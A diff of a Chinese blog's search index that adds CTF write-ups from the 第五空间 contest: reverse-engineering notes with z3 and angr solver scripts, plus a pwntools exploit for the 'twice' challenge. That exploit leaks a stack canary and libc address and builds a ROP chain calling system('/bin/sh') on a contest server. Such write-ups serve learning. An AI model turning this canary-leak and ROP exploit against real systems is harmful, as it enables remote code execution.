@@ -1,6 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>第五空间CTF</title>
+    <url>/2020/06/24/2020-6-24/</url>
+    <content><![CDATA[<h3 id="Nop">Nop</h3>
+<p>首先进去后有两个地方的反调试我们nop掉</p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/OUM755%7DNNAHZ04ZCLNOM7QC-1592972447377.png"  alt="img"></p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/OUM755%7DNNAHZ04ZCLNOM7QC-1592972465085.png"  alt="img"></p>
+<p>这两个位置nop掉，后进行分析</p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200624122403065.png"  alt="image-20200624122403065"></p>
+<p>这是整理好的文件，大概看到了eax的三次++,以及一次</p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200624122435866.png"  alt="image-20200624122435866"></p>
+<p>也就是eax + 0xCCCCCCCF</p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200624122504215.png"  alt="image-20200624122504215"></p>
+<p>主要问题在这里，进行了两次的nop地址，所以说下面的那个jmp只需要到right，反推-0xCCCCCCCF</p>
+<p>0x108048765-0xCCCCCCCF= 93,507,990‬</p>
+<h3 id="ManageCode">ManageCode</h3>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200625125548172.png"  alt="image-20200625125548172"></p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200625125611199.png"  alt="image-20200625125611199"></p>
+<p>我们对应的RVA，这里学到了OD调试C#的一个东西，mscoree._CorExeMain是C#导入表只有这个函数，其他都是框架处理了</p>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200625125742462.png"  alt="image-20200625125742462"></p>
+<p>z3解方程即可，这里也学到了z3解方程的知识</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [Int(('x%d' % i)) for i in range(32)]</span><br><span class="line">v1 = 1</span><br><span class="line">v2 = a1[0]</span><br><span class="line">v33 = a1[0]</span><br><span class="line">v3 = a1[2]</span><br><span class="line">v31 = a1[2]</span><br><span class="line">s.add (-307337 * v2 == -29811689)</span><br><span class="line">v4 = a1[1]</span><br><span class="line">v32 = a1[1]</span><br><span class="line">s.add (31219 * v2 - 470462 * v4 == -7321921)</span><br><span class="line">v5 = 282799 * v4</span><br><span class="line">v6 = a1[3]</span><br><span class="line">v30 = a1[3]</span><br><span class="line">s.add (v5 + 145509 * v3 - 299180 * v33 == 13723877)</span><br><span class="line">v7 = v1</span><br><span class="line">s.add (475769 * v6 - 175678 * v32 - 389730 * v3 - 482630 * v33 == -95216128)</span><br><span class="line">v29 = a1[4]</span><br><span class="line">s.add (-491556 * v33 - 36988 * v29 + 107882 * v32 + -208516 * v6 - 340530 * v3 == -159608574)</span><br><span class="line">v8 = a1[5]</span><br><span class="line">v27 = v8</span><br><span class="line">s.add (115318 * v8 + 467004 * v33 + 110069 * v29 + 82828 * v31 - 14270 * v32 - 303753 * v6 == 59922906)</span><br><span class="line">v9 = a1[6]</span><br><span class="line">v28 = v9</span><br><span class="line">s.add (-279354 * v8 - 301605 * v30 + 336041 * v33 + 45022 * v31 + 111726 * v32 - 146340 * v29 - 237939 * v9 == -82351664)</span><br><span class="line">v10 = a1[7]</span><br><span class="line">v26 = v10</span><br><span class="line">s.add (-147932 * v29</span><br><span class="line">        - 23111 * v27</span><br><span class="line">        + 356418 * v30</span><br><span class="line">        + 157129 * v9</span><br><span class="line">        + 96850 * v31</span><br><span class="line">        + 459807 * v10</span><br><span class="line">        + -239175 * v33</span><br><span class="line">        - 15611 * v32 == 54529836)</span><br><span class="line">v11 = a1[8]</span><br><span class="line">v25 = v11</span><br><span class="line">s.add (-288572 * v10</span><br><span class="line">        - 452860 * v11</span><br><span class="line">        - 281026 * v31</span><br><span class="line">        + 459847 * v29</span><br><span class="line">        + 105871 * v32</span><br><span class="line">        + 363927 * v28</span><br><span class="line">        + 107668 * v33</span><br><span class="line">        + 305746 * v27</span><br><span class="line">        + 474305 * v30 == 94077867)</span><br><span class="line">v12 = a1[9]</span><br><span class="line">v24 = a1[9]</span><br><span class="line">v13 = v7</span><br><span class="line">s.add (24450 * v32</span><br><span class="line">        + 318367 * v27</span><br><span class="line">        + 131436 * v33</span><br><span class="line">        + 163730 * v31</span><br><span class="line">        + 68350 * v30</span><br><span class="line">        + -200364 * v12</span><br><span class="line">        - 367700 * v26</span><br><span class="line">        - 298737 * v11</span><br><span class="line">        - 26977 * v28</span><br><span class="line">        - 411916 * v29 == -20388052)</span><br><span class="line">v14 = v13</span><br><span class="line">v15 = a1[10]</span><br><span class="line">v23 = v15</span><br><span class="line">s.add (23830 * v31</span><br><span class="line">        + 389775 * v26</span><br><span class="line">        + 301398 * v32</span><br><span class="line">        + 367177 * v27</span><br><span class="line">        + 311452 * v30</span><br><span class="line">        - 434957 * v12</span><br><span class="line">        - 136393 * v15</span><br><span class="line">        - 172925 * v25</span><br><span class="line">        - 146025 * v33</span><br><span class="line">        - 493051 * v28</span><br><span class="line">        - 130882 * v29 == -88920064)</span><br><span class="line">v16 = a1[11]</span><br><span class="line">v22 = v16</span><br><span class="line">s.add (-427662 * v33</span><br><span class="line">        - 98903 * v29</span><br><span class="line">        - 17320 * v15</span><br><span class="line">        - 218483 * v32</span><br><span class="line">        - 85741 * v30</span><br><span class="line">        + 363857 * v26</span><br><span class="line">        + 163521 * v16</span><br><span class="line">        + 304649 * v27</span><br><span class="line">        + -43728 * v25</span><br><span class="line">        - 181088 * v31</span><br><span class="line">        + 173715 * v24</span><br><span class="line">        + 14457 * v28 == -61620324)</span><br><span class="line">v17 = a1[12]</span><br><span class="line">v21 = v17</span><br><span class="line">s.add (-195542 * v27</span><br><span class="line">        - 498833 * v32</span><br><span class="line">        - 412336 * v24</span><br><span class="line">        - 216657 * v29</span><br><span class="line">        - 501433 * v16</span><br><span class="line">        + 271173 * v31</span><br><span class="line">        + 74652 * v30</span><br><span class="line">        + 373303 * v28</span><br><span class="line">        - 306925 * v25</span><br><span class="line">        - 338825 * v26</span><br><span class="line">        - 475559 * v33</span><br><span class="line">        - 358450 * v17</span><br><span class="line">        - (v23 &lt;&lt; 15) == -174934821)</span><br><span class="line">v18 = a1[13]</span><br><span class="line">s.add (110210 * v22</span><br><span class="line">        + -351890 * v31</span><br><span class="line">        - 184149 * v24</span><br><span class="line">        - 437072 * v17</span><br><span class="line">        + 324022 * v28</span><br><span class="line">        + 357830 * v25</span><br><span class="line">        + 162554 * v26</span><br><span class="line">        + 369921 * v32</span><br><span class="line">        + 142164 * v29</span><br><span class="line">        + 136219 * v23</span><br><span class="line">        + 49387 * v33</span><br><span class="line">        - 323429 * v18</span><br><span class="line">        - 198716 * v30</span><br><span class="line">        - 411630 * v27 != -124829042)</span><br><span class="line">v19 = a1[14]</span><br><span class="line">s.add (473866 * v23</span><br><span class="line">        + -257967 * v32</span><br><span class="line">        - 222834 * v26</span><br><span class="line">        - 118361 * v25</span><br><span class="line">        + 426304 * v33</span><br><span class="line">        + 507378 * v19</span><br><span class="line">        + 362998 * v21</span><br><span class="line">        - 342754 * v27</span><br><span class="line">        - 266674 * v24</span><br><span class="line">        - 61369 * v18</span><br><span class="line">        - 267106 * v29</span><br><span class="line">        - 388543 * v22</span><br><span class="line">        - 97045 * v28</span><br><span class="line">        - 229602 * v31</span><br><span class="line">        - 84816 * v30 == 78977681)</span><br><span class="line">s.add (402402 * v23</span><br><span class="line">        + 477363 * v29</span><br><span class="line">        + 447356 * v27</span><br><span class="line">        + 46659 * v22</span><br><span class="line">        + -89442 * v25</span><br><span class="line">        - 455802 * v28</span><br><span class="line">        - 290697 * v33</span><br><span class="line">        - 108648 * v18</span><br><span class="line">        + 279039 * v19</span><br><span class="line">        + 520878 * v24</span><br><span class="line">        + 335538 * v32</span><br><span class="line">        + 310844 * v31</span><br><span class="line">        + 110817 * v26</span><br><span class="line">        - 433259 * a1[15]</span><br><span class="line">        - 525875 * v21</span><br><span class="line">        - 2295 * v30 == 80694627)</span><br><span class="line"></span><br><span class="line">if s.check()==sat:</span><br><span class="line">    print "sat"</span><br><span class="line">    print s.model()</span><br><span class="line">else:</span><br><span class="line">    print "un"</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/" class="lazyload" data-src="/2020/06/24/2020-6-24/image-20200625125824629.png"  alt="image-20200625125824629"></p>
+<h3 id="rev">rev</h3>
+<p>直接看到是个虚拟机，判断条件不是很多直接angr，一梭子网上找的模板，也是之前科二师傅给我的模板</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line">def main(argv):</span><br><span class="line">    bin_path = argv[1]</span><br><span class="line">    p = angr.Project(bin_path)</span><br><span class="line">    argv1 = claripy.BVS("argv1", 100 * 8)</span><br><span class="line">    init_state = p.factory.entry_state(args = [bin_path,argv1])</span><br><span class="line">    sim = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line">    def is_good(state):</span><br><span class="line">        return b'right' in state.posix.dumps(1)</span><br><span class="line">    </span><br><span class="line">    def is_bad(state):</span><br><span class="line">        return b'wrong' in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">    sim.explore(find = is_good ,avoid = is_bad)</span><br><span class="line"></span><br><span class="line">    if sim.found:</span><br><span class="line">        found_state = sim.found[0]</span><br><span class="line">        print("Flag: {}".format(found_state.posix.dumps(0)))</span><br><span class="line">        print()</span><br><span class="line">        solution = found_state.solver.eval(argv1, cast_to=bytes)</span><br><span class="line">        print(bytes.decode(solution).strip('\x00')) # 先解码转换成str，再去掉\x00</span><br><span class="line">    else :</span><br><span class="line">        print("cannot found a solution")</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="twice">twice</h3>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"  #"i386"</span><br><span class="line">exe = './pwn'</span><br><span class="line">elf = ELF(exe)</span><br><span class="line"># p = process(exe)</span><br><span class="line">#p = process(['exe'],env={"LD_PRELOAD":"libc"})</span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"></span><br><span class="line">p = remote('121.36.59.116',9999)</span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line">#------------------------------------</span><br><span class="line">def d(s = ''):</span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    # d("b *0x400844")</span><br><span class="line">    payload = '\x11'*0x59</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil("\x11"*0x58)</span><br><span class="line">    cananry = u64(p.recv(8)) - 0x11</span><br><span class="line">    stack_addr = u64(p.recv(6).ljust(8,'\x00'))- 0x70</span><br><span class="line">    </span><br><span class="line">    payload = p64(0x0000000000400923)+p64(elf.got['puts'])+p64(elf.plt['puts'])</span><br><span class="line">    payload += p64(0x00000000040087B)+p64(0)*6</span><br><span class="line">    payload += p64(stack_addr)+p64(cananry) + p64(stack_addr-8)</span><br><span class="line">    payload += p64(0x0000000000400879) </span><br><span class="line">    # payload1 += p64(stack_addr)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x6f690</span><br><span class="line"></span><br><span class="line">    payload2 = p64(0x0000000000400923) + p64(libc.search("/bin/sh\x00").next()) + p64(libc.sym['system'])</span><br><span class="line">    payload2 += p64(0)*8 + p64(cananry) + p64(stack_addr-0x60) + p64(0x0000000000400879)</span><br><span class="line">    p.sendline("\x11"*0x10)</span><br><span class="line">    </span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line">#-------------------------------------</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></tbody></table></figure>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>CTF-RE</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>D-Link</title>
+    <url>/2020/06/22/D-Link/</url>
+    <content><![CDATA[<h3 id="DSR-250N">DSR-250N</h3>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+  </entry>
+  <entry>
     <title>程序员的自我修养</title>
     <url>/2020/06/21/2020-6-21/</url>
     <content><![CDATA[<p>终于可以看上这个特别好的这本书了，大家都很推荐的：程序员的自我修养，上本书其实让我很好的了解了，底层的release版本和debug版本的不同，以及工作原理等等，让我有了个大概了解，想通过这本书，让自己有个更深刻的了解</p>
@@ -33,9 +108,11 @@
     <content><![CDATA[<h1>TODO List</h1>
 <h2 id="Book">Book</h2>
 <ul>
+<li>滴水逆向</li>
 <li>程序员的自我修养</li>
 <li>加密与解密4</li>
 <li>操作系统导论</li>
+<li>编译原理</li>
 <li>A Friendly Introduction to Number Theory</li>
 <li>Understanding Cryptography</li>
 </ul>
@@ -242,9 +319,6 @@ Please input password:</p>
             document.body.appendChild(img);
           });
       </script>]]></content>
-      <categories>
-        <category>CTF-RE</category>
-      </categories>
   </entry>
   <entry>
     <title>C++反汇编与逆向分析技术揭秘</title>
